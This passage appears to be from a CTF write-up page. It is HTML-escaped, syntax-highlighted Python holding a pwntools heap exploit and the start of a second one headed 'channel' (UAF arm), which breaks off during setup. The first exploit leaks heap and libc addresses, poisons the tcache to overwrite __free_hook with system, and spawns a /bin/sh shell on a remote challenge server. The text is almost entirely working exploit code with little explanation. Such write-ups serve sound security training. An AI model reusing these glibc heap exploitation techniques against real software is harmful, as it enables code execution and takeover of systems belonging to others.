	&lt;span class=&#34;n&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sendlineafter&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;Index:&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;
	&lt;span class=&#34;n&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sendlineafter&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;Size:&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;size&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;
&lt;span class=&#34;k&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;edit&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;content&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;):&lt;/span&gt;
	&lt;span class=&#34;n&#34;&gt;menu&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
	&lt;span class=&#34;n&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sendlineafter&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;Index:&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;
	&lt;span class=&#34;n&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sendlineafter&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;Content:&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;content&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;k&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;show&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;():&lt;/span&gt;
	&lt;span class=&#34;n&#34;&gt;menu&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
	&lt;span class=&#34;n&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sendlineafter&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;Index:&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;
&lt;span class=&#34;k&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;free&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;():&lt;/span&gt;
	&lt;span class=&#34;n&#34;&gt;menu&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
	&lt;span class=&#34;n&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sendlineafter&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;Index:&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;p&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;process&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;./main&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;p&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;remote&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;124.70.35.238&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;23717&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;libc&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ELF&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;./libc-2.27.so&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;add&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x78&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;i&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;range&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;):&lt;/span&gt;
	&lt;span class=&#34;n&#34;&gt;edit&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\x00&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x10&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
	&lt;span class=&#34;n&#34;&gt;free&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;show&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;recvuntil&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;Content: &amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;heap_base&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;u64&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;recv&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;6&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ljust&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;8&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\x00&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;  &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x260&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;log&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;info&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;HEAP:&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\t&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;hex&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;heap_base&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;

&lt;span class=&#34;n&#34;&gt;edit&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;p64&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;heap_base&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x10&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;add&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x78&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;add&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x78&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;

&lt;span class=&#34;n&#34;&gt;edit&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\x00&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x23&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\x07&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;free&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;show&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;libc_base&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;u64&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;recvuntil&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\x7F&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)[&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;6&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:]&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ljust&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;8&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\x00&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;libc&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sym&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;__malloc_hook&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x70&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;log&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;info&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;LIBC:&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\t&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;hex&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;libc_base&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;

&lt;span class=&#34;n&#34;&gt;edit&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\x03&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\x00&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x3F&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p64&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;libc_base&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;libc&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sym&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;__free_hook&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;8&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;add&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x18&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;edit&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;/bin/sh&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\x00&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p64&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;libc_base&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;libc&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sym&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;system&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]))&lt;/span&gt;

&lt;span class=&#34;n&#34;&gt;free&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;interactive&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;channel&#34;&gt;channel&lt;/h3&gt;
&lt;p&gt;UAF arm&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;kn&#34;&gt;from&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;pwn&lt;/span&gt; &lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;
&lt;span class=&#34;c1&#34;&gt;#context.log_level = &amp;#39;DEBUG&amp;#39;&lt;/span&gt;
&lt;span class=&#34;k&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;menu&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ch&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;):&lt;/span&gt;
	&lt;span class=&#34;n&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sendlineafter&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;gt; &amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ch&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;
&lt;span class=&#34;k&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;Register&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;key&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;):&lt;/span&gt;
	&lt;span class=&#34;n&#34;&gt;menu&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
	&lt;span class=&#34;n&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sendafter&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;key&amp;gt; &lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;key&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;k&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;UnRegister&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;key&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;):&lt;/span&gt;
	&lt;span class=&#34;n&#34;&gt;menu&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
	&lt;span class=&#34;n&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sendafter&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;key&amp;gt; &lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;key&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;k&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;Read&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;key&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;):&lt;/span&gt;
	&lt;span class=&#34;n&#34;&gt;menu&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
	&lt;span class=&#34;n&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sendafter&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;key&amp;gt; &lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;key&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;k&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;Write&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;key&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;len&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;content&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;):&lt;/span&gt;
	&lt;span class=&#34;n&#34;&gt;menu&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
	&lt;span class=&#34;n&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sendafter&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;key&amp;gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;key&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
	&lt;span class=&#34;n&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sendlineafter&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;len&amp;gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;len&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;
	&lt;span class=&#34;n&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sendafter&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;content&amp;gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;content&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;c1&#34;&gt;#p = process(&amp;#39;./qemu-aarch64-static -g 4444 -L $(pwd)/LIB ./main&amp;#39;,shell=True)&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;p&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;remote&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;124.70.35.238&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;23680&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;

&lt;span class=&#34;n&#34;&gt;libc&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ELF&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;./libc-2.31.so&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;

&lt;span class=&#34;n&#34;&gt;Register&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;fmyy&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;Register&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;FMYY&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;Register&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;TMP&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;Register&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;0&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;Register&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;1&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
